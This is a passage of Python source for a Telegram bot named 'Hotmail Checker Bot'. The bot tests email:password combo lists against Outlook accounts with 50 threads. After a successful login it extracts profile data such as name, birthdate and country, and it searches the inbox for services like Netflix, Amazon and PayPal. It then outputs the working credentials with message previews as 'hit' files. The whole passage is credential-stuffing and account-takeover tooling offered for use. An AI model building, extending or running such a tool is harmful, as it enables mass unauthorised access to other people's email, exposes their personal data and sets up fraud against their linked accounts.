                text_to_copy = copy_cache[copy_id]
                # Show copied message
                await callback_query.answer("✅ Copied to clipboard!\n📋 Click and hold to select text", show_alert=True)
                
                # Send the text as a separate message for easy copying
                await callback_query.message.reply_text(
                    f"📋 **Copy this text:**\n\n"
                    f"```\n{text_to_copy}\n```\n\n"
                    f"_Click above to select, then copy_",
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                await callback_query.answer("❌ Copy failed. Text not found.", show_alert=True)
    
    except Exception as e:
        logger.error(f"Callback error: {e}")
        await callback_query.answer("❌ Error occurred", show_alert=True)

async def send_main_menu(message: Message):
    """Send main menu"""
    welcome_text = (
        f"👋 **Welcome to Hotmail Checker Bot!**\n\n"
        f"**Powerful Outlook Account Checker**\n"
        f"• Login & Profile Extraction\n"
        f"• Inbox Search for Targets\n"
        f"• Batch Processing (50 threads) ⚡\n"
        f"• Real-time Hit Notifications\n"
        f"• Automatic File Cleanup\n\n"
        f"{format_credits()}"
    )
    
    await message.edit_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=create_main_keyboard()
    )

@app.on_message(filters.command("start"))
async def start_command(client, message: Message):
    """Start command handler"""
    # Send typing animation
    await send_typing_animation(message.chat.id, 1)
    
    welcome_text = (
        f"🌟 **Hotmail Checker Bot**\n\n"
        f"Welcome to the most advanced Outlook account checker!\n"
        f"⚡ **Now with 50 threads for faster checking!**\n\n"
        f"{format_credits()}\n\n"
        f"**Select an option below to get started:**"
    )
    
    await message.reply_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=create_main_keyboard()
    )

@app.on_message(filters.command("check"))
async def check_command(client, message: Message):
    """Single account check command"""
    user_id = message.from_user.id
    
    # Send thinking animation
    await send_thinking_animation(message.chat.id)
    
    # Check if user already has an active task
    if is_user_busy(user_id):
        await message.reply_text(
            f"⚠️ **Task Already Running**\n\n"
            f"You already have an active task.\n"
            f"Use `/stop` to cancel it first or check status.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    # Parse command
    args = message.text.split()[1:]
    if len(args) < 2:
        await message.reply_text(
            f"❌ **Invalid Format**\n\n"
            f"**Usage:**\n"
            f"`/check email:password target1 target2`\n\n"
            f"**Example:**\n"
            f"`/check test@hotmail.com:password123 netflix amazon`\n\n"
            f"**Note:** Separate multiple targets with space",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    # Parse credentials
    creds = args[0]
    if ":" not in creds:
        await message.reply_text(
            f"❌ **Invalid Credential Format**\n\n"
            f"Please use `email:password` format.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    email, password = creds.split(":", 1)
    targets = args[1:]
    
    # Add task
    add_task(user_id, "single", {"email": email, "password": password, "targets": targets})
    
    # Process in background
    asyncio.create_task(process_single_check(user_id, email, password, targets, message))

async def process_single_check(user_id: int, email: str, password: str, targets: List[str], message: Message):
    """Process single check and send results"""
    try:
        # Send initial status with animation
        status_msg = await message.reply_text(
            f"🔍 **Starting Account Check**\n"
            f"{get_animation_frame()} **Processing...**\n\n"
            f"• **Email**: `{email}`\n"
            f"• **Targets**: {', '.join(targets)}\n\n"
            f"⏳ Please wait while I check the account...",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        
        # Simulate progress animation
        animation_task = asyncio.create_task(update_check_animation(status_msg))
        
        async with OutlookProfileChecker(user_id, debug=True) as checker:
            result = await checker.check_account(email, password, targets)
        
        # Cancel animation
        animation_task.cancel()
        
        if result["status"] == "SUCCESS":
            # Send success animation
            await send_typing_animation(message.chat.id, 1)
            
            # Format response
            response_text = f"✅ **LOGIN SUCCESSFUL**\n\n"
            response_text += f"• **Account**: `{email}:{password}`\n\n"
            
            if result["profile"]:
                profile = result["profile"]
                response_text += f"📋 **PROFILE INFORMATION**\n"
                if profile['name']:
                    response_text += f"• **Name**: `{profile['name']}`\n"
                if profile['country']:
                    response_text += f"• **Country**: `{profile['country']}`\n"
                if profile['birthdate']:
                    response_text += f"• **Birthdate**: `{profile['birthdate']}`\n"
                response_text += f"\n"
            
            response_text += f"🔍 **SEARCH RESULTS**\n\n"
            
            hits_found = False
            for target in targets:
                if target in result.get("searches", {}):
                    search_result = result["searches"][target]
                    
                    if search_result["status"] == "SUCCESS":
                        if search_result.get("has_results") and search_result.get("results"):
                            hits_found = True
                            results = search_result["results"]
                            response_text += f"🎯 **{target.upper()}:** ✅ FOUND\n"
                            response_text += f"   ├ Total Messages: `{results['total']}`\n"
                            response_text += f"   ├ Last Message: `{results['last_message_date']}`\n"
                            
                            if results['senders']:
                                response_text += f"   ├ Senders: `{', '.join(results['senders'][:3])}`\n"
                            
                            if results['preview']:
                                response_text += f"   └ Preview: `{results['preview'][:80]}...`\n"
                        else:
                            response_text += f"❌ **{target.upper()}:** No results\n"
                    else:
                        response_text += f"⚠️ **{target.upper()}:** Error\n"
                else:
                    response_text += f"⚠️ **{target.upper()}:** Not searched\n"
            
            # Create summary line in the requested format
            summary_line = f"{email}:{password}"
            if result["profile"]:
                profile = result["profile"]
                if profile['name']:
                    summary_line += f" | Name = {profile['name']}"
                if profile['birthdate']:
                    summary_line += f" | birthDate = {profile['birthdate']}"
                if profile['country']:
                    summary_line += f" | Country = {profile['country']}"
            
            if hits_found:
                for target in targets:
                    if target in result.get("searches", {}):
                        search_result = result["searches"][target]
                        if search_result.get("has_results"):
                            results = search_result.get("results", {})
                            summary_line += f" | Target = {target}"
                            summary_line += f" | Total = {results.get('total', 0)}"
                            summary_line += f" | hasMsgFromTarget = ✔️"
                            
                            if results.get('preview'):
                                preview = results['preview']
                                preview = re.sub(r'[\u2000-\u200F\u2028-\u202F\u205F-\u206F\uFEFF\u00AD]', '', preview)
                                preview = re.sub(r'\s+', ' ', preview).strip()
                                if len(preview) > 80:
                                    preview = preview[:77] + "..."
                                summary_line += f" | Preview = {preview}"
                            
                            if results.get('last_message_date'):
                                summary_line += f" | lastMsg = {results['last_message_date']}"
                            
                            summary_line += f" | BotBy = {OWNER_USERNAME}"
                            break
            
            response_text += f"\n📝 **SUMMARY**\n```\n{summary_line}\n```\n\n"
            response_text += f"👑 **Configured by:** {OWNER_USERNAME}"
            
            # Create copy keyboard with working copy button
            keyboard = create_copy_keyboard(summary_line)
            
        else:
            response_text = f"❌ **LOGIN FAILED**\n\n"
            response_text += f"• **Account**: `{email}:{password}`\n"
            response_text += f"• **Error**: `{result.get('error', 'Unknown error')}`\n"
            response_text += f"• **Status**: `{result['status']}`\n\n"
            response_text += f"💡 **Tips:**\n"
            response_text += f"• Check email/password\n"
            response_text += f"• Account might be locked\n"
            response_text += f"• Try different account"
            
            keyboard = create_back_keyboard()
        
        await status_msg.edit_text(response_text, parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)
        
    except Exception as e:
        logger.error(f"Single check error: {e}")
        await message.reply_text(
            f"❌ **Error Occurred**\n\n"
            f"Error: `{str(e)}`\n\n"
            f"Please try again or contact {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
    finally:
        remove_task(user_id)

async def update_check_animation(message: Message):
    """Update animation during single check"""
    animation_index = 0
    while True:
        try:
            animation_index = (animation_index + 1) % len(ANIMATION_FRAMES)
            await message.edit_text(
                f"🔍 **Checking Account**\n"
                f"**{ANIMATION_FRAMES[animation_index]}** **Processing...**\n\n"
                f"⏳ This may take a moment...",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
            await asyncio.sleep(1)
        except:
            break

@app.on_message(filters.command("batch"))
async def batch_command(client, message: Message):
    """Batch check command"""
    user_id = message.from_user.id
    
    # Send thinking animation
    await send_thinking_animation(message.chat.id)
    
    # Check if user already has an active task
    if is_user_busy(user_id):
        await message.reply_text(
            f"⚠️ **Task Already Running**\n\n"
            f"You already have an active task.\n"
            f"Use `/stop` to cancel it first or check status.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    # Check if message is a reply to a file
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply_text(
            f"📁 **Batch File Required**\n\n"
            f"**How to use batch check:**\n"
            f"1. Send me a `.txt` file with email:password combos\n"
            f"2. Reply to that file with `/batch target1 target2`\n\n"
            f"**File Format:**\n"
            f"```\nemail1:password1\nemail2:password2\nemail3:password3\n```\n\n"
            f"**Example:**\n"
            f"Reply to your file with:\n"
            f"`/batch netflix amazon paypal`\n\n"
            f"⚡ **50 threads will be used for faster processing!**\n"
            f"📦 **Files sent:** hit_{{target}}.txt & free.txt",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    # Get targets from command
    args = message.text.split()[1:]
    if not args:
        await message.reply_text(
            f"🎯 **Targets Required**\n\n"
            f"Please specify targets to search for:\n"
            f"Example: `netflix amazon paypal`\n\n"
            f"Reply to the file with targets separated by space.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    targets = args
    
    # Download the file
    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await message.reply_text(
            f"❌ **Invalid File Type**\n\n"
            f"Please send a `.txt` file.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    try:
        # Download file
        download_path = await client.download_media(doc)
        
        # Read accounts
        async with aiofiles.open(download_path, 'r', encoding='utf-8') as f:
            content = await f.read()
        
        # Parse accounts
        accounts = []
        for line in content.splitlines():
            line = line.strip()
            if ':' in line:
                email, password = line.split(':', 1)
                accounts.append((email.strip(), password.strip()))
        
        # Clean up
        os.remove(download_path)
        
        if not accounts:
            await message.reply_text(
                f"❌ **No Valid Accounts**\n\n"
                f"No valid email:password combos found in the file.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
            return
        
        # Add task
        add_task(user_id, "batch", {
            "total_accounts": len(accounts),
            "targets": targets
        })
        
        # Start batch processing with 50 threads
        asyncio.create_task(batch_worker(user_id, accounts, targets, message))
        
        await message.reply_text(
            f"⚡ **Batch Processing Started**\n\n"
            f"┌─────────────────────────┐\n"
            f"│ **Accounts**: {len(accounts)}\n"
            f"│ **Targets**: {', '.join(targets)}\n"
            f"│ **Threads**: 50 ⚡\n"
            f"│ **Status**: Initializing...\n"
            f"└─────────────────────────┘\n\n"
            f"{get_animation_frame()} **Starting 50 workers...**\n\n"
            f"📦 **Will send:** hit_{{target}}.txt & free.txt\n"
            f"👑 **By:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        
    except Exception as e:
        logger.error(f"Batch command error: {e}")
        await message.reply_text(
            f"❌ **Error Processing File**\n\n"
            f"Error: `{str(e)}`\n\n"
            f"Please check the file format and try again.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )

@app.on_message(filters.command("stop"))
async def stop_command(client, message: Message):
    """Stop current task command"""
    user_id = message.from_user.id
    
    if stop_user_task(user_id):
        await message.reply_text(
            f"🛑 **Task Stopped Successfully**\n\n"
            f"Your current task has been terminated.\n\n"
            f"You can start a new task from the menu.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
    else:
        await message.reply_text(
            f"ℹ️ **No Active Task**\n\n"
            f"You don't have any running task to stop.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )

@app.on_message(filters.command("status"))
async def status_command(client, message: Message):
    """Check task status command"""
    user_id = message.from_user.id
    
    await send_thinking_animation(message.chat.id)
    
    if user_id in active_tasks:
        task = active_tasks[user_id]
        elapsed = time.time() - task["start_time"]
        
        status_text = (
            f"📊 **Task Status**\n\n"
            f"┌─────────────────────────┐\n"
            f"│ **Type**: {task['type'].upper()}\n"
            f"│ **Status**: {'✅ Running' if task.get('running', True) else '🛑 Stopped'}\n"
            f"│ **Duration**: {elapsed:.1f}s\n"
        )
        
        if task["type"] == "batch":
            status_text += f"│ **Accounts**: {task['data'].get('total_accounts', 'N/A')}\n"
            status_text += f"│ **Targets**: {', '.join(task['data'].get('targets', []))}\n"
            status_text += f"│ **Threads**: 50 ⚡\n"
        
        status_text += f"└─────────────────────────┘\n\n"
        status_text += f"{get_animation_frame()} **Working...**"
        
    else:
        status_text = (
            f"📊 **Task Status**\n\n"
            f"ℹ️ **No active task found.**\n\n"
            f"Start a new task from the main menu."
        )
    
    await message.reply_text(
        status_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=create_back_keyboard()
    )

@app.on_message(filters.command("help"))
async def help_command(client, message: Message):
    """Help command handler"""
    help_text = (
        f"📖 **Help & Instructions**\n\n"
        f"**Available Commands:**\n"
        f"• `/check email:pass target1 target2` - Single account check\n"
        f"• `/batch` - Batch check (reply to .txt file)\n"
        f"• `/stop` - Stop current task\n"
        f"• `/status` - Check task status\n\n"
        f"**Features:**\n"
        f"• Real-time hit notifications 🎯\n"
        f"• Profile extraction 📋\n"
        f"• Inbox search for targets 🔍\n"
        f"• Batch processing with 50 threads ⚡\n"
        f"• Copy button for easy copying 📋\n"
        f"• Automatic file cleanup 🧹\n\n"
        f"**Need Help?**\n"
        f"Contact: {OWNER_USERNAME}\n\n"
        f"{format_credits()}"
    )
    
    await message.reply_text(
        help_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=create_back_keyboard()
    )

# Error handler
@app.on_message(filters.command(["check", "batch", "stop", "status", "help"]))
async def command_error_handler(client, message: Message):
    """Handle command errors"""
    pass

# Main function
async def main():
    """Main function to run the bot"""
    logger.info("Starting Hotmail Checker Bot...")
    
    # Display startup banner
    banner = """
    ┌─────────────────────────────┐
    │   HOTMAIL CHECKER BOT v2.0  │
    │    Enhanced UI Edition      │
    │      50 THREADS MODE ⚡     │
    │    AUTO CLEANUP ENABLED     │
    └─────────────────────────────┘
    """
    print(banner)
    
    await app.start()
    
    # Get bot info
    bot_info = await app.get_me()
    logger.info(f"Bot started: @{bot_info.username}")
    logger.info(f"Owner: {OWNER_USERNAME}")
    logger.info(f"Max Threads: {MAX_THREADS}")
    
    # Send startup notification to owner
    try:
        await app.send_message(
            OWNER_ID,
            f"🤖 **Bot Started Successfully!**\n\n"
            f"• Bot: @{bot_info.username}\n"
            f"• Threads: {MAX_THREADS} ⚡\n"
            f"• Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"• Status: ✅ Online\n"
            f"• Auto Cleanup: ✅ Enabled",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.warning(f"Could not send startup notification: {e}")
    
    # Keep running
    await asyncio.Event().wait()

if __name__ == "__main__":
    # Create event loop and run bot
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    finally:
        loop.run_until_complete(app.stop())
        loop.close()
